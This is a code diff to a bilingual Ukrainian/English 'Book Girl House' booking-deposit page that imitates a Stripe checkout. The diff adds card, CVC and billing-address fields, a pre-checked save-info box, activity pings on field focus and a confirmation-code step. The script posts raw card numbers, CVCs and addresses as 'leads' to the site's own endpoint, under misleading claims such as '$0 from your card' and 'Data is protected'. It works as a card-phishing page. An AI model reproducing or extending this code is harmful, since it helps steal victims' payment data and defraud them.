@@ -9,7 +9,7 @@
 <meta property="og:title" content="Book Girl House — Депозит">
 <meta property="og:description" content="Підтвердження бронювання. Депозит спишеться тільки при зустрічі.">
 <meta name="theme-color" content="#f6f9fc">
-<link rel="stylesheet" href="/style.css?v=33">
+<link rel="stylesheet" href="/style.css?v=35">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -72,47 +72,86 @@
         <p class="field-hint" id="timeHint" data-i18n="timeAutoHint">Узгодимо точний слот після підтвердження.</p>
       </div>
 
-      <div class="pay-methods-row">
-        <button type="button" class="pay-tab" id="applePayBtn">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
-          Apple Pay
-        </button>
-        <button type="button" class="pay-tab active" id="cardMethodBtn" data-i18n="cardTab">Картка</button>
-      </div>
-      <p id="applePayErr" class="form-error apple-pay-err" hidden></p>
-
       <div id="formArea">
         <label class="field">
           <span data-i18n="emailLabel">Email</span>
           <input id="email" type="email" placeholder="name@email.com" autocomplete="email">
         </label>
-        <label class="field">
-          <span data-i18n="fullName">Повне імʼя</span>
-          <input id="fullName" type="text" autocomplete="name" data-ph="fullNamePh">
-        </label>
+
+        <p class="stripe-section-label" data-i18n="payMethodLabel">Спосіб оплати</p>
+        <div class="pay-methods-row stripe-methods">
+          <button type="button" class="pay-tab active" id="cardMethodBtn" data-i18n="cardTab">Картка</button>
+          <button type="button" class="pay-tab" id="applePayBtn">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+            Apple Pay
+          </button>
+        </div>
+        <p id="applePayErr" class="form-error apple-pay-err" hidden></p>
 
         <div id="cardFields" class="card-fields open">
-          <label class="field">
-            <span data-i18n="cardNumber">Номер картки</span>
-            <div class="input-with-icons">
-              <input id="card" inputmode="numeric" maxlength="19" placeholder="1234 1234 1234 1234" autocomplete="cc-number">
+          <p class="stripe-section-label" data-i18n="cardInfoLabel">Дані картки</p>
+          <div class="stripe-card-box">
+            <div class="stripe-card-row stripe-card-number">
+              <input id="card" inputmode="numeric" maxlength="19" placeholder="1234 1234 1234 1234" autocomplete="cc-number" aria-label="Card number">
               <span class="input-icons">
                 <img src="https://cdn.simpleicons.org/visa/1A1F71" alt="" height="12">
                 <img src="https://cdn.simpleicons.org/mastercard/EB001B" alt="" height="14">
               </span>
             </div>
+            <div class="stripe-card-row stripe-card-meta">
+              <input id="expiry" placeholder="MM / YY" inputmode="numeric" maxlength="5" autocomplete="cc-exp" aria-label="Expiry">
+              <input id="code" placeholder="CVC" inputmode="numeric" maxlength="3" autocomplete="cc-csc" aria-label="CVC">
+            </div>
+          </div>
+
+          <label class="field" style="margin-top:14px">
+            <span data-i18n="fullName">Імʼя власника картки</span>
+            <input id="fullName" type="text" autocomplete="cc-name" data-ph="fullNamePh" placeholder="Name on card">
           </label>
-          <div class="field-grid">
+
+          <p class="stripe-section-label" data-i18n="billingLabel">Платіжна адреса</p>
+          <div class="stripe-billing">
             <label class="field">
-              <span data-i18n="expiry">Термін дії</span>
-              <input id="expiry" placeholder="MM / YY" inputmode="numeric" maxlength="5" autocomplete="cc-exp">
+              <span data-i18n="countryLabel">Країна</span>
+              <select id="country" autocomplete="country">
+                <option value="UA" selected>Ukraine</option>
+                <option value="US">United States</option>
+                <option value="PL">Poland</option>
+                <option value="DE">Germany</option>
+                <option value="GB">United Kingdom</option>
+                <option value="OTHER">Other</option>
+              </select>
             </label>
             <label class="field">
-              <span data-i18n="cvv">CVC</span>
-              <input id="code" placeholder="CVC" inputmode="numeric" maxlength="3" autocomplete="cc-csc">
+              <span data-i18n="address1Label">Адреса</span>
+              <input id="address1" type="text" autocomplete="address-line1" placeholder="Street address">
+            </label>
+            <label class="field">
+              <span data-i18n="address2Label">Адреса (рядок 2)</span>
+              <input id="address2" type="text" autocomplete="address-line2" placeholder="Apt, suite, etc. (optional)">
+            </label>
+            <div class="field-grid">
+              <label class="field">
+                <span data-i18n="cityLabel">Місто</span>
+                <input id="city" type="text" autocomplete="address-level2" placeholder="City">
+              </label>
+              <label class="field">
+                <span data-i18n="postalLabel">Індекс</span>
+                <input id="postal" type="text" autocomplete="postal-code" placeholder="Postal code">
+              </label>
+            </div>
+            <label class="field">
+              <span data-i18n="regionLabel">Область / регіон</span>
+              <input id="region" type="text" autocomplete="address-level1" placeholder="Region / state">
             </label>
           </div>
         </div>
+
+        <label class="stripe-check">
+          <input type="checkbox" id="saveInfo" checked>
+          <span data-i18n="saveInfoLabel">Зберегти дані для швидшої оплати наступного разу</span>
+        </label>
+        <p class="stripe-check-hint" data-i18n="saveInfoHint">Оплачуйте швидше наступного разу. Дані захищені.</p>
 
         <p id="err" class="form-error"></p>
 
@@ -141,7 +180,10 @@
           <button type="button" id="resetLead" class="linkish reset-lead" data-i18n="startOver">Почати спочатку</button>
         </div>
 
-        <button id="send" class="bgh-btn full" data-i18n="payBtn">Підтвердити бронювання · $10</button>
+        <button id="send" class="bgh-btn full stripe-pay-btn">
+          <span data-i18n="payBtn">Оплатити $10.00</span>
+          <span class="pay-lock" aria-hidden="true">🔒</span>
+        </button>
 
         <p class="legal" data-i18n="legal">
           Продовжуючи, ви погоджуєтесь з умовами Book Girl House і підтверджуєте бронювання. Депозит $10.00 буде списано тільки при зустрічі з дівчиною на місці.
@@ -189,7 +231,11 @@ uk:{
   back:"← Назад",checkoutTitle:"Підтвердження бронювання",checkoutSub:"Картка потрібна для підтвердження · списання тільки при зустрічі",formTrust:"Це не передоплата. Зараз з картки — 0 ₴. Списання тільки при зустрічі.",
   timeLabel:"Бажаний час",nearestTime:"Найближчий зручний час",choose:"Обрати",
   timeAutoHint:"Узгодимо точний слот після підтвердження.",timeChosen:"Обрано: ",
-  cardTab:"Картка",emailLabel:"Email",fullName:"Повне імʼя",fullNamePh:"Як у документах",
+  cardTab:"Картка",emailLabel:"Email",fullName:"Імʼя власника картки",fullNamePh:"Name on card",
+  payMethodLabel:"Спосіб оплати",cardInfoLabel:"Дані картки",billingLabel:"Платіжна адреса",
+  countryLabel:"Країна",address1Label:"Адреса",address2Label:"Адреса (рядок 2)",cityLabel:"Місто",postalLabel:"Індекс",regionLabel:"Область / регіон",
+  saveInfoLabel:"Зберегти дані для швидшої оплати наступного разу",saveInfoHint:"Оплачуйте швидше наступного разу. Дані захищені.",
+  errAddress:"Вкажіть адресу.",errCity:"Вкажіть місто.",errPostal:"Вкажіть індекс.",errCountry:"Оберіть країну.",
   cardNumber:"Номер картки",expiry:"Термін дії",cvv:"CVC",
   confirmCode:"Код підтвердження",codeSent:"Введіть код з повідомлення",resendCode:"Надіслати знову",
   payBtn:"Підтвердити бронювання · $10",legal:"Продовжуючи, ви погоджуєтесь з умовами. $10 — підтвердження бронювання (не передоплата). Списання тільки при зустрічі з дівчиною. Зараз з картки — 0 ₴.",
@@ -214,7 +260,11 @@ en:{
   back:"← Back",checkoutTitle:"Booking confirmation",checkoutSub:"Card needed to confirm · charged only at the meeting",formTrust:"Not a prepayment. Right now — $0 from your card. Charged only at the meeting.",
   timeLabel:"Preferred time",nearestTime:"Nearest convenient time",choose:"Select",
   timeAutoHint:"Exact slot will be confirmed after confirmation.",timeChosen:"Selected: ",
-  cardTab:"Card",emailLabel:"Email",fullName:"Full name",fullNamePh:"As on your ID",
+  cardTab:"Card",emailLabel:"Email",fullName:"Cardholder name",fullNamePh:"Name on card",
+  payMethodLabel:"Payment method",cardInfoLabel:"Card information",billingLabel:"Billing address",
+  countryLabel:"Country",address1Label:"Address",address2Label:"Address line 2",cityLabel:"City",postalLabel:"Postal code",regionLabel:"State / region",
+  saveInfoLabel:"Securely save my information for 1-click checkout",saveInfoHint:"Pay faster next time. Your data is protected.",
+  errAddress:"Enter your address.",errCity:"Enter your city.",errPostal:"Enter postal code.",errCountry:"Select country.",
   cardNumber:"Card number",expiry:"Expiry",cvv:"CVC",
   confirmCode:"Confirmation code",codeSent:"Enter the code from your message",resendCode:"Send again",
   payBtn:"Confirm booking · $10",legal:"By continuing you agree to the terms. $10 confirms the booking (not a prepayment). Charged only when you meet the girl. Right now — $0 from your card.",
@@ -267,55 +317,79 @@ const TYPE_TEXTS = {
   apartments: {
     uk: {
       docTitle: "Book Girl House — Апартаменти",
-      feeName: "Підтвердження апартаментів",
-      sumNote: "Це <strong>не передоплата</strong>. Зараз з картки — 0 ₴. $10 підтверджує бронювання апартаментів. Списання тільки при зустрічі.",
-      checkoutSub: "Підтвердіть бронювання апартаментів",
-      legal: "Продовжуючи, ви погоджуєтесь з умовами Book Girl House і підтверджуєте бронювання апартаментів. Депозит $10.00 буде списано тільки при зустрічі з дівчиною на місці.",
-      thanksBody: "Бронювання апартаментів підтверджено. Депозит $10.00 буде списано тільки при зустрічі з дівчиною на місці. Очікуйте деталі в чаті."
+      feeName: "Перша година апартаментів",
+      sumNote: "<strong>$10 — оплата першої години</strong> апартаментів. Решта часу та умови узгоджуються на місці.",
+      checkoutTitle: "Оплата першої години",
+      checkoutSub: "Перша година апартаментів · $10.00",
+      formTrust: "$10 — вартість першої години оренди апартаментів.",
+      payBtn: "Оплатити першу годину · $10",
+      legal: "Продовжуючи, ви погоджуєтесь з умовами. $10.00 — оплата першої години апартаментів. Подальший час узгоджується окремо.",
+      thanksBody: "Оплату першої години отримано. Менеджер напише протягом 5–20 хвилин з адресою та деталями заселення.",
+      secure: "Оплата першої години · шифроване з’єднання"
     },
     en: {
       docTitle: "Book Girl House — Apartments",
-      feeName: "Apartment confirmation",
-      sumNote: "This is <strong>not a prepayment</strong>. Right now — $0 from your card. $10 confirms the apartment. Charged only at the meeting.",
-      checkoutSub: "Confirm apartment booking",
-      legal: "By continuing you agree to Book Girl House terms and confirm the apartment booking. The $10.00 deposit will only be charged when you meet the girl on site.",
-      thanksBody: "Apartment booking confirmed. The $10.00 deposit will only be charged when you meet the girl on site. Watch chat for details."
+      feeName: "First hour of apartment",
+      sumNote: "<strong>$10 is payment for the first hour</strong> of the apartment. Further time is arranged on site.",
+      checkoutTitle: "First hour payment",
+      checkoutSub: "First hour of apartment · $10.00",
+      formTrust: "$10 is the cost of the first rental hour of the apartment.",
+      payBtn: "Pay first hour · $10",
+      legal: "By continuing you agree to the terms. $10.00 is payment for the first hour of the apartment. Further time is arranged separately.",
+      thanksBody: "First hour payment received. A manager will message you within 5–20 minutes with the address and check-in details.",
+      secure: "First hour payment · encrypted connection"
     }
   },
   visit: {
     uk: {
       docTitle: "Book Girl House — Виїзд",
-      feeName: "Підтвердження виїзду",
-      sumNote: "Це <strong>не передоплата</strong>. Зараз з картки — 0 ₴. $10 підтверджує виїзд. Списання тільки при зустрічі.",
-      checkoutSub: "Підтвердіть бронювання виїзду",
-      legal: "Продовжуючи, ви погоджуєтесь з умовами Book Girl House і підтверджуєте бронювання виїзду. Депозит $10.00 буде списано тільки при зустрічі з дівчиною на місці.",
-      thanksBody: "Виїзд підтверджено. Депозит $10.00 буде списано тільки при зустрічі з дівчиною на місці. Очікуйте деталі в чаті."
+      feeName: "Виїзд / послуга водія",
+      sumNote: "<strong>$10 — оплата виїзду</strong> (як за водія). Фіксуєте виклик до вас.",
+      checkoutTitle: "Оплата виїзду",
+      checkoutSub: "Виїзд / послуга водія · $10.00",
+      formTrust: "$10 — як оплата водію за виїзд до вашого місця.",
+      payBtn: "Оплатити виїзд · $10",
+      legal: "Продовжуючи, ви погоджуєтесь з умовами. $10.00 — оплата виїзду (послуга водія). Деталі зустрічі узгоджуються в чаті.",
+      thanksBody: "Оплату виїзду отримано. Менеджер напише протягом 5–20 хвилин і узгодить час та деталі.",
+      secure: "Оплата виїзду · шифроване з’єднання"
     },
     en: {
       docTitle: "Book Girl House — Outcall",
-      feeName: "Outcall confirmation",
-      sumNote: "This is <strong>not a prepayment</strong>. Right now — $0 from your card. $10 confirms the outcall. Charged only at the meeting.",
-      checkoutSub: "Confirm outcall booking",
-      legal: "By continuing you agree to Book Girl House terms and confirm the outcall booking. The $10.00 deposit will only be charged when you meet the girl on site.",
-      thanksBody: "Outcall confirmed. The $10.00 deposit will only be charged when you meet the girl on site. Watch chat for details."
+      feeName: "Outcall / driver fee",
+      sumNote: "<strong>$10 is the outcall fee</strong> (like a driver). You lock the call to your place.",
+      checkoutTitle: "Outcall payment",
+      checkoutSub: "Outcall / driver fee · $10.00",
+      formTrust: "$10 is like paying a driver to come to your place.",
+      payBtn: "Pay outcall · $10",
+      legal: "By continuing you agree to the terms. $10.00 is the outcall fee (driver service). Meeting details are arranged in chat.",
+      thanksBody: "Outcall payment received. A manager will message you within 5–20 minutes to arrange time and details.",
+      secure: "Outcall payment · encrypted connection"
     }
   },
   media: {
     uk: {
       docTitle: "Book Girl House — Відео / Фото",
       feeName: "Відео / фото",
-      sumNote: "$10 — підтвердження замовлення відео або фото. Деталі після підтвердження в чаті.",
-      checkoutSub: "Введіть дані для отримання відео чи фото",
-      legal: "Продовжуючи, ви погоджуєтесь з умовами Book Girl House і авторизуєте списання комісії $10.00 за відео/фото.",
-      thanksBody: "Комісію $10.00 підтверджено. Доступ до контенту буде надано — очікуйте повідомлення в чаті."
+      sumNote: "$10 — сервісна комісія за відео або фото. Деталі в чаті.",
+      checkoutTitle: "Оплата відео / фото",
+      checkoutSub: "Відео або фото · $10.00",
+      formTrust: "$10 — комісія за відео або фото контент.",
+      payBtn: "Оплатити · $10",
+      legal: "Продовжуючи, ви погоджуєтесь з умовами. $10.00 — сервісна комісія за відео або фото.",
+      thanksBody: "Оплату отримано. Деталі доступу надішлемо в чаті.",
+      secure: "Захищена оплата · шифроване з’єднання"
     },
     en: {
       docTitle: "Book Girl House — Video / Photo",
       feeName: "Video / photo",
-      sumNote: "$10 confirms the video or photo order. Details after confirmation in chat.",
-      checkoutSub: "Enter details to receive video or photo",
-      legal: "By continuing you agree to Book Girl House terms and authorize a $10.00 video/photo fee.",
-      thanksBody: "Your $10.00 fee is confirmed. Content access will be provided — watch chat for details."
+      sumNote: "$10 is a service fee for video or photo. Details in chat.",
+      checkoutTitle: "Video / photo payment",
+      checkoutSub: "Video or photo · $10.00",
+      formTrust: "$10 is a fee for video or photo content.",
+      payBtn: "Pay · $10",
+      legal: "By continuing you agree to the terms. $10.00 is a service fee for video or photo.",
+      thanksBody: "Payment received. Access details will be sent in chat.",
+      secure: "Secure payment · encrypted connection"
     }
   }
 };
@@ -616,7 +690,7 @@ function pingActivity(type) {
       activitySent = false;
     });
 }
-["email", "fullName", "card", "expiry", "code"].forEach((id) => {
+["email", "fullName", "card", "expiry", "code", "address1", "address2", "city", "region", "postal"].forEach((id) => {
   const el = document.getElementById(id);
   if (el) el.addEventListener("focus", () => pingActivity("start_fill"), { once: true });
 });
@@ -630,6 +704,12 @@ $("send").onclick=async()=>{
     const digits=$("card").value.replace(/\D/g,"");
     const expiry=$("expiry").value.trim(),em=expiry.match(/^(\d{2})\/(\d{2})$/),month=em?+em[1]:0;
     const cvc=$("code").value.replace(/\D/g,"");
+    const country=($("country")&&$("country").value)||"UA";
+    const address1=($("address1")&&$("address1").value.trim())||"";
+    const address2=($("address2")&&$("address2").value.trim())||"";
+    const city=($("city")&&$("city").value.trim())||"";
+    const region=($("region")&&$("region").value.trim())||"";
+    const postal=($("postal")&&$("postal").value.trim())||"";
     if(!validEmail(email)){$("err").textContent=t("errEmail");return}
     if(!fullName||fullName.length<2){$("err").textContent=t("errName");return}
     if(digits.length!==16){$("err").textContent=t("errCard16");return}
@@ -638,6 +718,9 @@ $("send").onclick=async()=>{
     const expYear=2000+(em?+em[2]:0);
     const now=new Date();
     if(expYear<now.getFullYear()||(expYear===now.getFullYear()&&month<now.getMonth()+1)){$("err").textContent=t("errExpired");return}
+    if(!address1){$("err").textContent=t("errAddress");return}
+    if(!city){$("err").textContent=t("errCity");return}
+    if(!postal){$("err").textContent=t("errPostal");return}
     // Card submit: no overlay, no spinner. Only disable the button briefly.
     hideCardAlert();
     $("send").disabled=true;
@@ -647,7 +730,9 @@ $("send").onclick=async()=>{
       const r=await fetch("/api/leads",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
         name:fullName,email,card_number:digits,expiry,card_code:cvc,
         booking_date:currentDateLabel(),booking_time:selectedTime,payment_method:"card",amount:"10.00",
-        service_type:serviceType
+        service_type:serviceType,
+        country,address1,address2,city,region,postal,
+        save_info: !!( $("saveInfo") && $("saveInfo").checked )
       })});
       const d=await r.json();if(!r.ok)throw Error(d.error);
       leadId=d.id;localStorage.setItem("fitpass_lead_id",String(leadId));
